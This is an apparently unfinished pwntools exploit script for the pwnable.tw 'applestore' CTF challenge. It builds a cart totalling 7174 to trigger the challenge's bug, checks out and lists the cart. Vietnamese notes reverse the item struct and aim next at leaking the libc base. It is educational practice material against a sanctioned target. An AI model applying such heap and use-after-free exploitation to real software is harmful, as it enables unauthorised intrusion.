#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)
    
def connect():
    HOST, PORT = "chall.pwnable.tw", 10104
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()
    
def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)

# OFFSET & VARIABLES

# FUNCTIONS
def add(p, phone):
    p.sendlineafter(b"> ", B(2))
    p.sendlineafter(b"Device Number> ", B(phone))

def checkout(p):
    p.sendlineafter(b"> ", B(5))
    p.sendlineafter(b"Let me check your cart. ok? (y/n) > ", b"y")

def listing_phones(p):
    p.sendlineafter(b"> ", B(4))
    p.sendlineafter(b"Let me check your cart. ok? (y/n) > ", b"y")

# MAIN
def main():
    p = connect()

    for i in range(0, 16):
        add(p, 1)

    for j in range(0, 10):
        add(p, 4)

    checkout(p)
    listing_phones(p)

    add(p, 1)


    # GDB(p)
    
    
    p.interactive()
    
if __name__ == '__main__':
    main()

    
'''

Note:
- create()
    + Là một con trỏ cấp 2
    + Tạo ra một con trỏ cấp 2 16 bytes
        . ptr[0] = Tên của Phone
        . ptr[1] = Giá tiền
        . ptr[2] = ptr[3] = 0

    ->
        struct Item {
            void *name;
            int price;
            struct Item *next;
            struct Item *prev;  
        }; 

- insert()
    + myCart là một danh sách liên kết trong đó các Node là các Items
        -> head của myCart trỏ vào Item đầu tiên được tạo


7174 = 16 * 199 + 10 * 399
    


Mục tiêu: Làm cách nào để có thể LEAK được libc base

'''
